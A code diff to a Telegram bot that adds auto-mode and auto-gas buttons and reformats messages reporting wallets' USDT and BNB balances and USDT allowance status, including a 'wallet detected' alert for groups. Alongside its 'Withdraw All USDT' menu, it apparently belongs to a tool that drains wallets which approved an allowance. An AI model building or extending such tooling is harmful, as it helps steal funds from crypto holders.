@@ -19,6 +19,10 @@ def create_main_menu() -> InlineKeyboardMarkup:
         [InlineKeyboardButton("💰 Check Wallet Info", callback_data="check_wallet")],
         [InlineKeyboardButton("💸 Withdraw All USDT", callback_data="withdraw_all")],
         [InlineKeyboardButton("✏️ Withdraw Custom Amount", callback_data="withdraw_custom")],
+        [
+            InlineKeyboardButton("🤖 Auto Mode", callback_data="toggle_auto_mode"),
+            InlineKeyboardButton("⛽ Auto Gas", callback_data="toggle_auto_gas")
+        ],
         [InlineKeyboardButton("🔄 Refresh", callback_data="refresh")]
     ])
 
@@ -93,19 +97,61 @@ def log_user_action(user_id: int, username: str, action: str, details: str = "")
     """Log user actions for monitoring"""
     logger.info(f"User {user_id} (@{username or 'N/A'}) performed action: {action} {details}")
 
-def create_wallet_info_text(address: str, balance: float, allowance: float) -> str:
+def create_wallet_info_text(address: str, usdt_balance: float, allowance: float, bnb_balance: float = None) -> str:
     """Create formatted wallet information text"""
     truncated_addr = truncate_address(address)
-    balance_str = format_usdt_amount(balance)
-    allowance_str = format_usdt_amount(allowance)
     
-    return (
-        f"🏦 *Wallet Information*\n\n"
-        f"📍 Address: `{truncated_addr}`\n"
-        f"💰 Balance: {balance_str}\n"
-        f"🔐 Allowance: {allowance_str}\n\n"
-        f"Choose an action below:"
+    # Check if wallet is approved
+    is_approved = allowance > 0
+    status_icon = "🟢" if is_approved else "🔴"
+    status_text = "Wallet Connected" if is_approved else "Wallet Not Approved"
+    
+    info_text = (
+        f"{status_icon} *{status_text}:*\n"
+        f"`{truncated_addr}`\n"
+        f"USDT Balance: {format_usd_amount(usdt_balance)}\n"
     )
+    
+    if bnb_balance is not None:
+        info_text += f"BNB Balance: {bnb_balance:.14f}\n"
+    
+    if is_approved:
+        info_text += f"\n✅ *USDT Approved:* `{truncated_addr}`\n"
+        info_text += f"USDT: {format_usd_amount(usdt_balance)}\n"
+        if bnb_balance is not None:
+            info_text += f"BNB: {bnb_balance:.14f}\n"
+    
+    info_text += f"\n🔐 Allowance: {format_usdt_amount(allowance)}"
+    
+    return info_text
+
+def format_usd_amount(usdt_amount: float) -> str:
+    """Format USDT amount as USD"""
+    return f"${usdt_amount:.2f}"
+
+def create_enhanced_wallet_detection_text(address: str, usdt_balance: float, bnb_balance: float, allowance: float) -> str:
+    """Create enhanced wallet detection message for groups/channels"""
+    truncated_addr = truncate_address(address)
+    is_approved = allowance > 0
+    
+    if is_approved:
+        return (
+            f"🟢 *Wallet Connected:*\n"
+            f"`{address}`\n"
+            f"USDT Balance: {format_usd_amount(usdt_balance)}\n"
+            f"BNB Balance: {bnb_balance:.14f}\n\n"
+            f"✅ *USDT Approved:* `{truncated_addr}`\n"
+            f"USDT: {format_usd_amount(usdt_balance)}\n"
+            f"BNB: {bnb_balance:.14f}"
+        )
+    else:
+        return (
+            f"🔴 *Wallet Detected:*\n"
+            f"`{address}`\n"
+            f"USDT Balance: {format_usd_amount(usdt_balance)}\n"
+            f"BNB Balance: {bnb_balance:.14f}\n\n"
+            f"❌ *Not Approved* - No allowance set"
+        )
 
 def create_error_message(error: str) -> str:
     """Create formatted error message"""
